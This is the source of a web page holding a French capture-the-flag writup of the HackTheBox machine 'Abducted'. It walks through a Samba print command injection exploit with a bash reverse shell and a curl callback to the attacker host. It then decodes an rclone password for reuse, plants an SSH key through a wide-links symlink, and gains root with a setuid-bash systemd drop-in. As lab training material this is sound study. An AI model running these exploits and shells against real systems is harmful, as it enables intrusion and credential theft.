import { Terminal, Key, Server, Shield, Network } from "lucide-react";
import { RevealFlagBlock } from "@/components/RevealFlag";
import { PageHeader } from "@/components/PageHeader";

function CodeBlock({
  children,
  title,
  result,
}: {
  children: string;
  title?: string;
  result?: boolean;
}) {
  const label = result ? "Résultat" : title;
  return (
    <div className="my-4">
      {label && (
        <p className={`mb-1 text-xs font-mono ${result ? "text-primary" : "text-muted-foreground"}`}>
          {label}
        </p>
      )}
      <pre className="overflow-x-auto rounded-lg border border-border bg-card p-4 font-mono text-sm text-muted-foreground">
        <code className="whitespace-pre">{children}</code>
      </pre>
    </div>
  );
}

export const metadata = {
  title: "Abducted | Writeup HTB | 0xbbuddha",
  description:
    "Writeup de la machine Abducted (HackTheBox, Medium, Linux) - CVE-2026-4480 Samba print injection, rclone credentials, wide links SMB, escalade polkit systemd.",
};

export default function WriteupAbductedPage() {
  return (
    <div className="mx-auto max-w-4xl px-4 py-8 sm:px-6 lg:px-10 lg:py-10">
      <PageHeader
        eyebrow="Writeup"
        title="Abducted"
        description="Serveur Samba qui expose un printer en guest. CVE-2026-4480 : le nom du job d'impression atterrit non échappé dans une commande shell, ce qui donne un RCE sans credentials via le pipe spoolss. Ensuite : rclone.conf world-readable avec mot de passe réutilisé, share SMB avec force user + wide links pour planter une authorized_keys, et privesc via drop-in systemd avec polkit."
        breadcrumbs={[
          { label: "README", href: "/" },
          { label: "Writeups", href: "/writeups" },
          { label: "Abducted" },
        ]}
        stats={[
          { label: "Platform", value: "HackTheBox" },
          { label: "Difficulty", value: "Medium" },
          { label: "OS", value: "Linux" },
          { label: "Date", value: "2026-06-22" },
          { label: "Focus", value: "CVE-2026-4480 / rclone / wide links / polkit" },
        ]}
      />

      <article className="mt-8 space-y-10">

        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Network className="size-5 text-primary" />
            1. Enumération
          </h2>
          <p className="text-muted-foreground">
            Nmap révèle deux services : SSH et Samba. Pas de service web. L&apos;énumération anonyme des
            shares Samba expose un printer <strong>HP-Reception</strong> accessible en guest, deux shares
            disque (<strong>projects</strong>, <strong>transfer</strong>) qui rejettent les connexions
            anonymes, et l&apos;IPC standard.
          </p>
          <CodeBlock title="Scan">
{`nmap -sVC --open -Pn 10.129.28.173

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.16
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4`}
          </CodeBlock>
          <CodeBlock title="Shares SMB (anonyme)">
{`smbclient -L //10.129.28.173 -N

  HP-Reception    Printer   Reception printer
  projects        Disk      Hartley Group Project Files
  transfer        Disk      Staff file transfer
  IPC$            IPC       IPC Service (Hartley Group Document Services)`}
          </CodeBlock>
          <p className="text-muted-foreground">
            Le share printer <strong>HP-Reception</strong> est le seul accessible sans credentials -
            c&apos;est le vecteur d&apos;entrée.
          </p>
        </section>

        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Terminal className="size-5 text-primary" />
            2. Foothold - CVE-2026-4480
          </h2>
          <p className="mb-3 text-muted-foreground">
            CVE-2026-4480 est une injection de commande dans le print subsystem de Samba. Quand un job
            se termine, Samba exécute la commande <code className="rounded bg-muted px-1">print command</code>{" "}
            configurée via <code className="rounded bg-muted px-1">system()</code>, en substituant{" "}
            <code className="rounded bg-muted px-1">%J</code> par le nom du document et{" "}
            <code className="rounded bg-muted px-1">%s</code> par le chemin du fichier spool. Aucun
            échappement n&apos;est appliqué sur <code className="rounded bg-muted px-1">%J</code> - c&apos;est
            le client qui le contrôle.
          </p>
          <p className="mb-3 text-muted-foreground">
            La commande configurée ici est{" "}
            <code className="rounded bg-muted px-1">/usr/local/bin/printaudit %J %s</code>. Avec{" "}
            <code className="rounded bg-muted px-1">{'document_name = "|sh"'}</code>, cela donne :
          </p>
          <CodeBlock title="Commande exécutée côté serveur">
{`/usr/local/bin/printaudit | sh <spoolfile>`}
          </CodeBlock>
          <p className="mb-3 text-muted-foreground">
            Le fichier spool est exécuté comme un script shell. Le corps du spool, c&apos;est ce qu&apos;on
            envoie via <code className="rounded bg-muted px-1">WritePrinter</code> - aucune restriction.
          </p>
          <p className="mb-3 text-muted-foreground">
            La subtilité : <strong>smbclient et smbspool sanitisent</strong> les métacaractères shell en{" "}
            <code className="rounded bg-muted px-1">_</code> avant qu&apos;ils n&apos;atteignent le{" "}
            <code className="rounded bg-muted px-1">%J</code>. Pour injecter des caractères utiles, il
            faut parler directement au pipe RPC <code className="rounded bg-muted px-1">\pipe\spoolss</code>{" "}
            - c&apos;est exactement ce que font les bindings Python Samba.
          </p>

          <h3 className="mb-3 mt-6 font-mono font-semibold text-foreground/80">Vérification OOB</h3>
          <p className="mb-3 text-muted-foreground">
            Avant le reverse shell, confirmation d&apos;exécution via un callback HTTP. On monte un serveur
            Python et on envoie un job avec <code className="rounded bg-muted px-1">curl</code> dans le corps du spool :
          </p>
          <CodeBlock title="Callback HTTP">
{`DATA = b"curl -s http://10.10.17.156:8080/pwned &\n"

# Résultat sur le serveur HTTP :
# 10.129.28.173 - "GET /pwned HTTP/1.1" 404 -  ← RCE confirmé`}
          </CodeBlock>

          <h3 className="mb-3 mt-6 font-mono font-semibold text-foreground/80">Exploit</h3>
          <CodeBlock title="exploit.py">
{`from samba.dcerpc import spoolss
from samba.param import LoadParm
from samba.credentials import Credentials

RHOST, LHOST, LPORT = "10.129.28.173", "10.10.17.156", 4444
DATA = ("bash -c 'bash -i >& /dev/tcp/%s/%d 0>&1' &\\n" % (LHOST, LPORT)).encode()

lp = LoadParm(); lp.load_default()
creds = Credentials(); creds.guess(lp); creds.set_anonymous()
iface = spoolss.spoolss(r"ncacn_np:%s[\\pipe\\spoolss]" % RHOST, lp, creds)

h = iface.OpenPrinter("\\\\\\\\%s\\\\HP-Reception" % RHOST, "",
                      spoolss.DevmodeContainer(), 0x00000008)
il = spoolss.DocumentInfo1()
il.document_name = "|sh"    # --> %J --> injection shell
il.output_file   = None
il.datatype      = "RAW"
ctr = spoolss.DocumentInfoCtr(); ctr.level = 1; ctr.info = il

iface.StartDocPrinter(h, ctr)
iface.StartPagePrinter(h)
iface.WritePrinter(h, DATA, len(DATA))
iface.EndPagePrinter(h)
iface.EndDocPrinter(h)       # déclenche l'exécution
iface.ClosePrinter(h)`}
          </CodeBlock>
          <CodeBlock title="Résultat" result>
{`connect to [10.10.17.156] from (UNKNOWN) [10.129.28.173] 55882
nobody@abducted:/var/spool/samba$ id
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)`}
          </CodeBlock>
        </section>

        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Key className="size-5 text-primary" />
            3. nobody {"->"} scott : rclone credentials
          </h2>
          <p className="mb-3 text-muted-foreground">
            Enumération du système depuis le shell <code className="rounded bg-muted px-1">nobody</code>.
            Un répertoire de backup hors-site est configuré dans{" "}
            <code className="rounded bg-muted px-1">/opt/offsite-backup/</code> et le fichier{" "}
            <code className="rounded bg-muted px-1">rclone.conf</code> est world-readable.
          </p>
          <CodeBlock title="/opt/offsite-backup/rclone.conf">
{`[offsite]
type = sftp
host = backup.hartley-group.internal
user = svc-backup
pass = HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
shell_type = unix`}
          </CodeBlock>
          <p className="mb-3 text-muted-foreground">
            rclone n&apos;encrypte pas les mots de passe - il les obscurcit en base64 réversible, et
            l&apos;outil lui-même peut les déchiffrer :
          </p>
          <CodeBlock title="Décodage">
{`rclone reveal HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
# → iXzvcib3SrpZ`}
          </CodeBlock>
          <p className="text-muted-foreground">
            Le mot de passe est réutilisé pour le compte <strong>scott</strong> en SSH :
          </p>
          <CodeBlock title="SSH scott">
{`ssh scott@10.129.28.173   # password: iXzvcib3SrpZ
uid=1000(scott) gid=1001(scott) groups=1001(scott)`}
          </CodeBlock>
          <RevealFlagBlock title="User flag">
{`REDACTED`}
          </RevealFlagBlock>
        </section>

        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Server className="size-5 text-primary" />
            4. scott {"->"} marcus : force user + wide links
          </h2>
          <p className="mb-3 text-muted-foreground">
            La configuration du share <strong>transfer</strong> contient deux paramètres clés :
          </p>
          <CodeBlock title="/etc/samba/shares.conf (extrait)">
{`[transfer]
    path = /srv/transfer
    valid users = scott
    force user = marcus
    read only = no
    wide links = yes
    browseable = yes`}
          </CodeBlock>
          <CodeBlock title="/etc/samba/smb.conf (global)">
{`unix extensions = no
allow insecure wide links = yes`}
          </CodeBlock>
          <p className="mb-3 text-muted-foreground">
            <code className="rounded bg-muted px-1">force user = marcus</code> : toute opération fichier
            via ce share s&apos;exécute sous l&apos;identité <strong>marcus</strong>, indépendamment du
            compte authentifié.{" "}
            <code className="rounded bg-muted px-1">wide links = yes</code> couplé à{" "}
            <code className="rounded bg-muted px-1">allow insecure wide links</code> : Samba suit les
            symlinks même s&apos;ils sortent de l&apos;arborescence du share.
          </p>
          <p className="mb-3 text-muted-foreground">
            Scott est propriétaire de <code className="rounded bg-muted px-1">/srv/transfer</code>. Il
            peut y planter un symlink vers le home de marcus, puis écrire via smbclient - les fichiers
            créés appartiendront à <strong>marcus</strong>.
          </p>
          <CodeBlock title="Génération clé SSH + symlink">
{`ssh-keygen -q -t ed25519 -N '' -f /tmp/k

# Symlink /srv/transfer/mh -> /home/marcus
ssh scott@10.129.28.173 'ln -sfn /home/marcus /srv/transfer/mh'`}
          </CodeBlock>
          <CodeBlock title="Dépôt authorized_keys via smbclient">
{`smbclient //10.129.28.173/transfer -U 'scott%iXzvcib3SrpZ' \\
  -c 'mkdir mh/.ssh; put /tmp/k.pub mh/.ssh/authorized_keys'

# putting file k.pub as \mh\.ssh\authorized_keys`}
          </CodeBlock>
          <CodeBlock title="SSH marcus">
{`ssh -i /tmp/k marcus@10.129.28.173
uid=1001(marcus) gid=1002(marcus) groups=1002(marcus),1000(operators)`}
          </CodeBlock>
        </section>

        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Shield className="size-5 text-primary" />
            5. marcus {"->"} root : drop-in systemd + polkit
          </h2>
          <p className="mb-3 text-muted-foreground">
            Marcus est membre du groupe <strong>operators</strong>. Enumération de ce que ce groupe peut
            modifier :
          </p>
          <CodeBlock title="Répertoire drop-in smbd">
{`ls -ld /etc/systemd/system/smbd.service.d/
drwxrws--- 2 root operators 4096 /etc/systemd/system/smbd.service.d/`}
          </CodeBlock>
          <p className="mb-3 text-muted-foreground">
            Le bit <code className="rounded bg-muted px-1">s</code> (setgid) et les droits{" "}
            <code className="rounded bg-muted px-1">w</code> pour <strong>operators</strong> : marcus peut
            créer des fichiers <code className="rounded bg-muted px-1">.conf</code> dans ce répertoire.
            Tout <code className="rounded bg-muted px-1">*.conf</code> dans un{" "}
            <code className="rounded bg-muted px-1">.service.d/</code> est un systemd drop-in - fusionné
            avec le service au prochain rechargement. smbd tourne en <strong>root</strong>, donc
            un <code className="rounded bg-muted px-1">ExecStartPre</code> s&apos;exécute en root.
          </p>
          <p className="mb-3 text-muted-foreground">
            Il reste un problème : écrire le drop-in est inutile si on ne peut pas recharger et redémarrer
            le service. Vérification des actions polkit disponibles sans authentification :
          </p>
          <CodeBlock title="Enumération polkit">
{`for action in $(pkaction); do
  pkcheck --action-id "$action" --process $$ 2>/dev/null && echo "ALLOWED: $action"
done

ALLOWED: org.freedesktop.systemd1.reload-daemon
# + règle conditionnelle sur smbd.service :
# systemctl restart smbd  → autorisé sans mot de passe`}
          </CodeBlock>
          <p className="mb-3 text-muted-foreground">
            Les deux conditions sont réunies : écriture du drop-in + restart autorisé. Le drop-in copie bash
            avec le bit setuid root avant que smbd ne démarre :
          </p>
          <CodeBlock title="Drop-in systemd">
{`cat > /etc/systemd/system/smbd.service.d/override.conf <<'EOF'
[Service]
ExecStartPre=/bin/cp /bin/bash /tmp/.rb
ExecStartPre=/bin/chmod 4755 /tmp/.rb
EOF

systemctl daemon-reload
systemctl restart smbd`}
          </CodeBlock>
          <CodeBlock title="Résultat" result>
{`ls -la /tmp/.rb
-rwsr-xr-x 1 root root 1446024 /tmp/.rb

/tmp/.rb -p -c 'id'
uid=1001(marcus) gid=1002(marcus) euid=0(root) groups=1002(marcus),1000(operators)`}
          </CodeBlock>
          <RevealFlagBlock title="Root flag">
{`REDACTED`}
          </RevealFlagBlock>
        </section>

        <section className="rounded-lg border border-border bg-card p-6">
          <h3 className="font-mono font-semibold text-primary">Récap</h3>
          <ul className="mt-2 list-inside list-disc space-y-1 text-sm text-muted-foreground">
            <li>Recon : SSH + Samba, share printer HP-Reception accessible en guest</li>
            <li>CVE-2026-4480 : pipe spoolss direct, <code className="rounded bg-muted px-1">{'document_name="|sh"'}</code>, corps du spool = reverse shell → <strong>nobody</strong></li>
            <li>rclone.conf world-readable, <code className="rounded bg-muted px-1">rclone reveal</code> → <code className="rounded bg-muted px-1">iXzvcib3SrpZ</code> réutilisé SSH → <strong>scott</strong></li>
            <li>SMB transfer : <code className="rounded bg-muted px-1">force user=marcus</code> + <code className="rounded bg-muted px-1">wide links</code>, symlink + authorized_keys → <strong>marcus</strong></li>
            <li>Groupe operators : drop-in smbd.service.d + polkit autorise restart → setuid bash → <strong>root</strong></li>
          </ul>
        </section>

      </article>
    </div>
  );
}
